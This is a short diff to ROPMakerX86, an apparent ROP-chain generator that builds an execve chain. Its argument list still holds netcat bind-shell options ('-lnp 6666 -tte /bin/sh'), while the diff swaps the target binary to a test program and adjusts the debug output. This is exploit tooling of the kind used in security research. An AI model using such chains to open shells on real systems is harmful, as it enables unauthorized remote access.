@@ -174,12 +174,12 @@ class ROPMakerX86(object):
         """
 
 
-        filename = "/tmp/nc"
+        filename = "/tmp/printArgs"
         # [filename, arg1, arg2, ...]
         args = [filename, '-lnp', '6666', '-tte', '/bin/sh']
         argPointers = []
 
-        env = []
+        env = ['name=Joe', 'OLDPWD=/home/vagrant', 'SHLVL=1']
         envPointers = []
 
         sects = self.__binary.getDataSections()
@@ -241,13 +241,13 @@ class ROPMakerX86(object):
 
         # Create arr of pointers to args
 
-        print("before alignment")
-        print(dataOffset)
+        # print("before alignment")
+        # print(dataOffset)
         if dataOffset % 4 != 0:
             # Align pointer arr
             dataOffset += 4 - (dataOffset % 4)
-        print("after alignment")
-        print(dataOffset)
+        # print("after alignment")
+        # print(dataOffset)
 
         argvArrPointer = dataAddr + dataOffset
 
@@ -328,6 +328,8 @@ class ROPMakerX86(object):
         outfile = open("execveChain", "wb")
         outfile.write(buff)
         outfile.close()
+
+        print(self.__binary)
 
     def __generate(self):
 
